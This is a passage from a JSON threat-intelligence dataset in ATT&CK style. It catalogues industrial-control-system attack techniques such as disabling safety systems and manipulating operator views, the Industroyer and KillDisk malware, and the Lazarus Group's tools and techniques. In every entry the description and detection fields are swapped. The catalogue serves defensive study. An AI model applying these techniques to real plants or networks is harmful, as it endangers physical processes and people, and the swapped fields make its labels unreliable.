                "name": "Block Command Message",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may block a command message from reaching its intended target to prevent command execution. In OT networks, command messages are sent to provide instructions to control system devices. A blocked command message can inhibit response functions from correcting a disruption or unsafe condition.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0813",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Denial of Control",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may cause a denial of control to temporarily prevent operators and engineers from interacting with process controls. An adversary may attempt to deny process control access to cause a temporary loss of communication with the control device or to prevent operator adjustment of process controls. An affected process may still be operating during the period of control loss, but not necessarily in a desired state.   \n\nIn the Maroochy attack, the adversary was able to temporarily shut an investigator out of the network preventing them from issuing any controls. In the 2017 Dallas Siren incident operators were unable to disable the false alarms from the Office of Emergency Management headquarters.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0816",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Device Restart/Shutdown",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may forcibly restart or shutdown a device in an ICS environment to disrupt and potentially negatively impact physical processes. Methods of device restart and shutdown exist in some devices as built-in, standard functionalities. These functionalities can be executed using interactive device web interfaces, CLIs, and network protocol commands. Unexpected restart or shutdown of control system devices may prevent expected response functions happening during critical states. A device restart can also be a sign of malicious device modifications, as many updates require a shutdown in order to take effect.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0880",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of Safety",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may compromise safety system functions designed to maintain safe operation of a process when unacceptable or dangerous conditions occur. Safety systems are often composed of the same elements as control systems but have the sole purpose of ensuring the process fails in a predetermined safe manner. Many unsafe conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage. Adversaries may target and disable safety system functions as a prerequisite to subsequent attack execution or to allow for future unsafe conditionals to go unchecked. Detection of a Loss of Safety by operators can result in the shutdown of a process due to strict policies regarding safety systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0832",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Manipulation of View",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may attempt to manipulate the information reported back to operators or controllers. This manipulation may be short term or sustained. During this time the process itself could be in a much different state than what is reported.    \n\nOperators may be fooled into doing something that is harmful to the system in a loss of view situation. With a manipulated view into the systems, operators may issue inappropriate control sequences that introduce faults or catastrophic failures into the system. Business analysis systems can also be provided with inaccurate data leading to bad management decisions.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Engineering Workstation",
                    "Human-Machine Interface"
                ]
            }
        },
        {
            "id": "T0846",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote System Discovery",
                "chain_phase": "discovery-ics",
                "description": [],
                "detection": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for subsequent Lateral Movement or Discovery techniques. Functionality could exist within adversary tools to enable this, but utilities available on the operating system or vendor software could also be used.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Data Historian",
                    "Safety Instrumented System/Protection Relay",
                    "Field Controller/RTU/PLC/IED",
                    "Human-Machine Interface"
                ]
            }
        },
        {
            "id": "T0804",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Block Reporting Message",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may block or prevent a reporting message from reaching its intended target. In control systems, reporting messages contain telemetry data (e.g., I/O values) pertaining to the current state of equipment and the industrial process. By blocking these reporting messages, an adversary can potentially hide their actions from an operator. Blocking reporting messages in control systems that manage physical processes may contribute to system impact, causing inhibition of a response function. A control system may not be able to respond in a proper or timely manner to an event, such as a dangerous fault, if its corresponding reporting message is blocked.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Input/Output Server"
                ]
            }
        },
        {
            "id": "T0807",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Command-Line Interface",
                "chain_phase": "execution-ics",
                "description": [],
                "detection": "Adversaries may utilize command-line interfaces (CLIs) to interact with systems and execute commands. CLIs provide a means of interacting with computer systems and are a common feature across many types of platforms and devices within control systems environments.  Adversaries may also use CLIs to install and run new software, including malicious tools that may be installed over the course of an operation.\n\nCLIs are typically accessed locally, but can also be exposed via services, such as SSH, Telnet, and RDP.  Commands that are executed in the CLI execute with the current permissions level of the process running the terminal emulator, unless the command specifies a change in permissions context.\n\nMany controllers have CLI interfaces for management purposes.\n\nDetection: Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0809",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Destruction",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may perform data destruction over the course of an operation. The adversary may drop or create malware, tools, or other non-native files on a target system to accomplish this, potentially leaving behind traces of malicious activities. Such non-native files and other data may be removed over the course of an intrusion to maintain a small footprint or as a standard part of the post-intrusion cleanup process.  \n\nData destruction may also be used to render operator interfaces unable to respond and to disrupt response functions from occurring as expected. An adversary may also destroy data backups that are vital to recovery after an incident.\n\nStandard file deletion commands are available on most operating system and device interfaces to perform cleanup, but adversaries may use other tools as well. Two examples are Windows Sysinternals SDelete and Active@ Killdisk.\n\nDetection: It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Human-Machine Interface",
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0814",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Denial of Service",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may perform Denial-of-Service (DoS) attacks to disrupt expected device functionality. Examples of DoS attacks include overwhelming the target device with a high volume of requests in a short time period and sending the target device a request it does not know how to handle. Disrupting device state may temporarily render it unresponsive, possibly lasting until a reboot can occur. When placed in this state, devices may be unable to send and receive requests, and may not perform expected response functions in reaction to other events in the environment.\n\nSome ICS devices are particularly sensitive to DoS events, and may become unresponsive in reaction to even a simple ping sweep. Adversaries may also attempt to execute a Permanent Denial-of-Service (PDoS) against certain devices, such as in the case of the BrickerBot malware. \n\nAdversaries may exploit a software vulnerability to cause a denial of service by taking advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in software that can be used to cause a  or denial of service condition.\n\nAdversaries may have prior knowledge about industrial protocols or control devices used in the environment through <span class=\"smw-format list-format \"><span class=\"smw-row\"><span class=\"smw-field\"><span class=\"smw-value\">Control Device Identification</span></span></span></span>. There are examples of adversaries remotely causing a <span class=\"smw-format list-format \"><span class=\"smw-row\"><span class=\"smw-field\"><span class=\"smw-value\">Device Restart/Shutdown</span></span></span></span> by exploiting a vulnerability that induces uncontrolled resource consumption.   \n\nIn the Maroochy attack, the adversary was able to shut an investigator out of the network.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "T0829",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of View",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may cause a sustained or permanent loss of view where the ICS equipment will require local, hands-on operator intervention; for instance, a restart or manual operation. By causing a sustained reporting or visibility loss, the adversary can effectively hide the present state of operations. This loss of view can occur without affecting the physical processes themselves.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0849",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Masquerading",
                "chain_phase": "evasion-ics",
                "description": [],
                "detection": "Adversaries may use masquerading to disguise a malicious application or executable as another file, to avoid operator and engineer suspicion. Possible disguises of these masquerading files can include commonly found programs, expected vendor executables and configuration files, and other commonplace application and naming conventions. By impersonating expected and vendor-relevant files and applications, operators and engineers may not notice the presence of the underlying malicious content and possibly end up running those masquerading as legitimate functions. \n\nApplications and other files commonly found on Windows systems or in engineering workstations have been impersonated before. This can be as simple as renaming a file to effectively disguise it in the ICS environment.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Control Server"
                ]
            }
        },
        {
            "id": "T0855",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Unauthorized Command Message",
                "chain_phase": "impair-process-control",
                "description": [],
                "detection": "Adversaries may send unauthorized command messages to instruct control system assets to perform actions outside of their intended functionality, or without the logical preconditions to trigger their expected function. Command messages are used in ICS networks to give direct instructions to control systems devices. If an adversary can send an unauthorized command message to a control system, then it can instruct the control systems device to perform an action outside the normal bounds of the device's actions. An adversary could potentially instruct a control systems device to perform an action that will cause an Impact. In the Maroochy Attack, the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer. In the Dallas Siren incident, adversaries were able to send command messages to activate tornado alarm systems across the city without an impending tornado or other disaster. Alarms were activated more than a dozen times. These disruptions occurred once in 2017, and later in a nearby county in 2019.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "S1004",
            "type": "tool",
            "attributes": {
                "name": "Industroyer",
                "aliases": [
                    "CRASHOVERRIDE"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Industroyer is a sophisticated piece of malware designed to cause an Impact to the working processes of Industrial Control Systems (ICS), specifically ICSs used in electrical substations. Industroyer was alleged to be used in the attacks on the Ukrainian power grid in December 2016.)",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T0888": "Remote System Information Discovery",
                    "T0837": "Loss of Protection",
                    "T0800": "Activate Firmware Update Mode",
                    "T0805": "Block Serial COM",
                    "T0810": "Data Historian Compromise",
                    "T0815": "Denial of View",
                    "T0827": "Loss of Control",
                    "T0806": "Brute Force I/O",
                    "T0802": "Automated Collection",
                    "T0831": "Manipulation of Control",
                    "T0840": "Network Connection Enumeration",
                    "T0881": "Service Stop",
                    "T0803": "Block Command Message",
                    "T0813": "Denial of Control",
                    "T0816": "Device Restart/Shutdown",
                    "T0880": "Loss of Safety",
                    "T0832": "Manipulation of View",
                    "T0846": "Remote System Discovery",
                    "T0804": "Block Reporting Message",
                    "T0807": "Command-Line Interface",
                    "T0809": "Data Destruction",
                    "T0814": "Denial of Service",
                    "T0829": "Loss of View",
                    "T0849": "Masquerading",
                    "T0855": "Unauthorized Command Message"
                }
            },
            "val": 25
        },
        {
            "id": "T0872",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Indicator Removal on Host",
                "chain_phase": "evasion-ics",
                "description": [],
                "detection": "Adversaries may attempt to remove indicators of their presence on a system in an effort to cover their tracks. In cases where an adversary may feel detection is imminent, they may try to overwrite, delete, or cover up changes they have made to the device.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Human-Machine Interface",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "S1005",
            "type": "tool",
            "attributes": {
                "name": "Killdisk",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "In 2015 the BlackEnergy malware contained a component called KillDisk. KillDisk's main functionality is to overwrite files with random data, rendering the OS unbootable.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T0872": "Indicator Removal on Host",
                    "T0881": "Service Stop",
                    "T0809": "Data Destruction",
                    "T0829": "Loss of View"
                }
            },
            "val": 4
        },
        {
            "id": "G0032",
            "type": "group",
            "attributes": {
                "val": 23,
                "name": "Lazarus Group",
                "aliases": [
                    "HIDDEN COBRA",
                    "Guardians of Peace",
                    "ZINC",
                    "NICKEL ACADEMY"
                ],
                "description": "Lazarus Group is a threat group that has been attributed to the North Korean government. The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by Lazarus Group correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain.  In late 2017, Lazarus Group used KillDisk, a disk-wiping tool, in an attack against an online casino based in Central America. \n\nNorth Korean group definitions are known to have significant overlap, and the name Lazarus Group is known to encompass a broad range of activity. Some organizations use the name Lazarus Group to refer to any activity attributed to North Korea. Some organizations track North Korean clusters or groups such as Bluenoroff, APT37, and APT38 separately, while other organizations may track some activity associated with those group names by the name Lazarus Group.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0593": "ECCENTRICBANDWAGON",
                    "S0586": "TAINTEDSCRIBE",
                    "S0584": "AppleJeus",
                    "S0567": "Dtrack",
                    "S0520": "BLINDINGCAN",
                    "S0498": "Cryptoistic",
                    "S0497": "Dacls",
                    "S0431": "HotCroissant",
                    "S0376": "HOPLIGHT",
                    "S0366": "WannaCry",
                    "S0364": "RawDisk",
                    "S0347": "AuditCred",
                    "S0245": "BADCALL",
                    "S0246": "HARDRAIN",
                    "S0241": "RATANKBA",
                    "S0239": "Bankshot",
                    "S0271": "KEYMARBLE",
                    "S0238": "Proxysvc",
                    "S0263": "TYPEFRAME",
                    "S0180": "Volgmer",
                    "S0181": "FALLCHILL",
                    "S0108": "netsh",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1588.004": "Digital Certificates",
                    "T1587.001": "Malware",
                    "T1583.006": "Web Services",
                    "T1583.001": "Domains",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1001.003": "Protocol Impersonation",
                    "T1132.001": "Standard Encoding",
                    "T1090.002": "External Proxy",
                    "T1571": "Non-Standard Port",
                    "T1074.001": "Local Data Staging",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.003": "Spearphishing via Service",
                    "T1566.001": "Spearphishing Attachment",
                    "T1564.001": "Hidden Files and Directories",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1562.001": "Disable or Modify Tools",
                    "T1561.002": "Disk Structure Wipe",
                    "T1561.001": "Disk Content Wipe",
                    "T1560.003": "Archive via Custom Method",
                    "T1560.002": "Archive via Library",
                    "T1560": "Archive Collected Data",
                    "T1491.001": "Internal Defacement",
                    "T1134.002": "Create Process with Token",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1110.003": "Password Spraying",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.002": "Software Packing",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1547.009": "Shortcut Modification",
                    "T1547.005": "Security Support Provider",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1218.001": "Compiled HTML File",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1542.003": "Bootkit",
                    "T1529": "System Shutdown/Reboot",
                    "T1496": "Resource Hijacking",
                    "T1489": "Service Stop",
                    "T1485": "Data Destruction",
                    "T1189": "Drive-by Compromise",
                    "T1203": "Exploitation for Client Execution",
                    "T1124": "System Time Discovery",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1098": "Account Manipulation",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1026": "Multiband Communication",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1010": "Application Window Discovery",
                    "T1008": "Fallback Channels",
                    "T1005": "Data from Local System",
                    "T0865": "Spearphishing Attachment"
                }
            }
        },
        {
            "id": "S0593",
            "type": "tool",
            "attributes": {
                "name": "ECCENTRICBANDWAGON",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ECCENTRICBANDWAGON is a Remote Access Tool (RAT) used by Lazarus Group that was first identified in August 2020. It is a reconnaissance tool--with keylogging and screen capture functionality--used for information gathering on compromised systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1113": "Screen Capture",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 6
        },
        {
            "id": "T1001.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Protocol Impersonation",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1036.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Match Legitimate Name or Location",
                "chain_phase": "defense-evasion",
                "description": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nIn containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.",
                "detection": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1027.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Binary Padding",
                "chain_phase": "defense-evasion",
                "description": "Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. ",
                "detection": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1070.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Timestomp",
                "chain_phase": "defense-evasion",
                "description": "Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.",
                "detection": "Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1124",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Time Discovery",
                "chain_phase": "discovery",
                "description": "Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.",
                "detection": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network.  \n\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. \n\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job , or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0586",
            "type": "tool",
            "attributes": {
                "name": "TAINTEDSCRIBE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TAINTEDSCRIBE is a fully-featured beaconing implant integrated with command modules used by Lazarus Group. It was first reported in May 2020.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1001.003": "Protocol Impersonation",
                    "T1059.003": "Windows Command Shell",
                    "T1560": "Archive Collected Data",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.001": "Binary Padding",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1018": "Remote System Discovery",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 16
        },
        {
            "id": "T1204.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Malicious File",
                "chain_phase": "execution",
                "description": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
                "detection": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading on the file to increase the likelihood that a user will open it.\n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1204.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Malicious Link",
                "chain_phase": "execution",
                "description": "Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.",
                "detection": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1569.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Launchctl",
                "chain_phase": "execution",
                "description": "KnockKnock can be used to detect persistent programs such as those installed via launchctl as launch agents or launch daemons. Additionally, every launch agent or launch daemon must have a corresponding plist file on disk which can be monitored. Monitor process execution from launchctl/launchd for unusual or unknown processes.",
                "detection": "Adversaries may abuse launchctl to execute commands or programs. Launchctl controls the macOS launchd process, which handles things like Launch Agents and Launch Daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\n\nBy loading or reloading Launch Agents or Launch Daemons, adversaries can install persistence or execute changes they made.\n\nRunning a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute \"arg\" \"arg\" \"arg\"</code>. Adversaries can abuse this functionality to execute code or even bypass application control if launchctl is an allowed process.",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "T1497.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Time Based Evasion",
                "chain_phase": "defense-evasion",
                "description": "Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ",
                "detection": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1566.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Spearphishing Link",
                "chain_phase": "initial-access",
                "description": "URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.",
                "detection": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Office 365",
                    "SaaS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1553.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Code Signing",
                "chain_phase": "defense-evasion",
                "description": "Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.",
